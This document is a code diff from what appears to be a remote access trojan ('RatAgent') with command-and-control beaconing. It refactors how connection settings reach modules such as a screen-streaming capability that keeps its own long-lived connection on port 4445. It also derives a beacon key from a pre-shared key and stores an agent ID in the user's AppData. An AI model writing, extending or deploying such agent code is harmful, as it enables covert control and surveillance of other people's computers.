@@ -4,11 +4,11 @@
 #include "module_id.h"
 
 #include "beacon.h"
+#include "capability.h"
 #include "cmd_dispatch.h"
 #include "crypto.h"
 #include "net.h"
 #include "protocol.h"
-#include "screen_stream.h"
 #include "session.h"
 
 #define WIN32_LEAN_AND_MEAN
@@ -200,7 +200,7 @@ namespace c2
             agent_ensure_id(a.id_path, agent_id);
             g_id_hex = hex_of(agent_id, kAgentIdLen);
             AgentConfig cfg = build_config(a, agent_id);
-            screen_stream_set_config(a.host, cfg);
+            cap_notify_config(a.host, cfg);   // 把连接配置交给已注册的能力（如屏幕流）
 
             int delay = 1;
             while (!agent_stop_requested())
@@ -305,8 +305,8 @@ namespace c2
             agent_ensure_id(a.id_path, agent_id);
             g_id_hex = hex_of(agent_id, kAgentIdLen);
             AgentConfig cfg = build_config(a, agent_id);
-            // 屏幕流长连接同样需要配置（协议 §9）
-            screen_stream_set_config(a.host, cfg);
+            // 把连接配置交给已注册的能力（协议 §9：屏幕流要自建 4445 长连接）
+            cap_notify_config(a.host, cfg);
 
             // beacon_key = HKDF-SHA256(PSK, agent_id, "rat-beacon-v1")（协议 §8.2）
             std::vector<uint8_t> beacon_key =
@@ -501,13 +501,16 @@ namespace c2
             return false;
         }
 
+        // 注册本模块的能力（各模块工程的 caps.cpp 提供；幂等，可重复 start）
+        cap_ensure_registered();
+
         g_args = args;
         if (g_args.id_path.empty())
         {
 #ifdef RAT_AGENT_DLL
-            g_args.id_path = agent_default_id_path(true);   // DLL：%LOCALAPPDATA%\RatAgent\agent.id
+            g_args.id_path = agent_default_id_path(true);   // DLL：%LOCALAPPDATA%\RatAgent\<module>.id
 #else
-            g_args.id_path = agent_default_id_path(false);  // EXE：CWD 下的 agent.id（历史行为）
+            g_args.id_path = agent_default_id_path(false);  // EXE：CWD 下的 <module>.id
 #endif
         }
         if (g_args.log_path.empty())
